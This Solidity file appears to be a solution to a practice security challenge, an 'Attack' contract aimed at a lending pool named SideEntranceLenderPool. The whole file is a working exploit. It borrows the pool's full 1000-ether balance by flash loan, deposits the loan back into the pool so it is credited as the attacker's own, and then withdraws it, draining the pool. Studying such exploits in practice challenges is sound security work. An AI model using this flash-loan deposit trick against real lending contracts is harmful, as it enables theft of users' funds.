// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './SideEntranceLenderPool.sol';

contract Attack{

    uint256 constant INITIAL_BALANCE_POOL = 1000 ether;
    SideEntranceLenderPool pool;
    constructor(SideEntranceLenderPool _pool){
        pool= _pool;
    }

    function attack()external{
        pool.flashLoan(INITIAL_BALANCE_POOL);
        pool.withdraw();
    }
    
    function execute()external payable{
            pool.deposit{value: msg.value}();
    }

    receive() external payable{}
}